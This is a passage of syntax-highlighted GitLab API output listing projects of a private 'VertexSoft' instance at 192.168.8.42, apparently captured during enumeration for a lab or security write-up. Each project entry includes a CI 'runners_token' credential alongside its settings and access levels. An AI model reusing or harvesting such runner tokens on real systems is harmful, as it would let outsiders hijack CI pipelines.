property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941cVxxrGfbYCRyHzGyNtRE"</span><span class="token punctuation">,</span>        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Hexo"</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Hexo"</span><span class="token punctuation">,</span>        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / Hexo"</span><span class="token punctuation">,</span>        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"hexo"</span><span class="token punctuation">,</span>        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/hexo"</span><span class="token punctuation">,</span>        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:31.691Z"</span><span class="token punctuation">,</span>        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"master"</span><span class="token punctuation">,</span>        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/hexo.git"</span><span class="token punctuation">,</span>        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/hexo.git"</span><span class="token punctuation">,</span>        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/hexo"</span><span class="token punctuation">,</span>        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/hexo/-/blob/master/README.md"</span><span class="token punctuation">,</span>        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:31.661Z"</span><span class="token punctuation">,</span>        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4"</span><span class="token punctuation">,</span>            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/issues"</span><span class="token punctuation">,</span>            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/merge_requests"</span><span class="token punctuation">,</span>            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/repository/branches"</span><span class="token punctuation">,</span>            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/labels"</span><span class="token punctuation">,</span>            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/events"</span><span class="token punctuation">,</span>            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/members"</span><span class="token punctuation">,</span>            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/cluster_agents"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T17:01:32.184Z"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token string">"gitlab_project"</span><span class="token punctuation">,</span>        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"finished"</span><span class="token punctuation">,</span>        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">"&lt;p data-sourcepos=\"1:1-1:4\" dir=\"auto\">Hexo&lt;/p>"</span><span class="token punctuation">,</span>        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:32.535Z"</span><span class="token punctuation">,</span>        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941CyxAy3dnsudA95t35ucx"</span><span class="token punctuation">,</span>        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">40</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token null keyword">null</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"VertexSoft Internal Employee Service App"</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexApp"</span><span class="token punctuation">,</span>        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / VertexApp"</span><span class="token punctuation">,</span>        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexapp"</span><span class="token punctuation">,</span>        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/vertexapp"</span><span class="token punctuation">,</span>        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:59.905Z"</span><span class="token punctuation">,</span>        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"master"</span><span class="token punctuation">,</span>        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/vertexapp.git"</span><span class="token punctuation">,</span>        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexapp.git"</span><span class="token punctuation">,</span>        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexapp"</span><span class="token punctuation">,</span>        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexapp/-/blob/master/README.md"</span><span class="token punctuation">,</span>        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:59.877Z"</span><span class="token punctuation">,</span>        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3"</span><span class="token punctuation">,</span>            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/issues"</span><span class="token punctuation">,</span>            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/merge_requests"</span><span class="token punctuation">,</span>            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/repository/branches"</span><span class="token punctuation">,</span>            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/labels"</span><span class="token punctuation">,</span>            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/events"</span><span class="token punctuation">,</span>            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/members"</span><span class="token punctuation">,</span>            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/cluster_agents"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T17:01:00.306Z"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>    